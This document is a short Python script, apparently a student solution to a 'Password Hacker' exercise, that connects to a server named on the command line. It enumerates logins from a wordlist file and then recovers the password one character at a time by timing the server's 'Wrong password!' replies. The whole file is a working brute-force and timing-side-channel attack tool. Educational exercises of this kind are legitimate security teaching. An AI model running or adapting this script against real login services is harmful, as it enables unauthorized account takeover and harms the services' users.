import string
from socket import socket
from sys import argv
import json
import time


def connect() -> json:
    address = (host, port)

    # Establish the connection with socket and pic up the password
    # until getting answer 'Connection success!' from server
    with socket() as con:
        con.connect(address)
        login = pick_up_login(con)
        password = pick_up_password(con, login)
        return json.dumps({"login": login, "password": password})


def pick_up_login(sock: socket) -> str:
    login_data = {"login": " ", "password": " "}
    for login in get_login():
        login_data["login"] = login
        sock.send(json.dumps(login_data).encode())
        if parse_result(sock.recv(1024).decode()) != "Wrong login!":
            return login


def pick_up_password(sock: socket, login: str) -> str:
    password = ""
    password_data = {"login": login, "password": " "}
    for let in get_password():
        password += let
        password_data["password"] = password
        start = time.perf_counter()
        sock.send(json.dumps(password_data).encode())
        result = parse_result(sock.recv(1024).decode())
        end = time.perf_counter()
        resp_time = (end - start) * 100
        if result == "Connection success!":
            return password
        if result == "Wrong password!" and resp_time < 1:
            password = password[:-1]


def parse_result(data) -> str:
    return json.loads(data)["result"]


def get_login() -> str:
    with open(path) as file:
        for line in file:
            yield line.strip("\n")


def get_password():
    while True:
        for letter in string.ascii_letters + string.digits:
            yield letter


if __name__ == '__main__':
    path = "C:\\Users\\iturk\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt"
    host = argv[1]
    port = int(argv[2])
    print(connect())
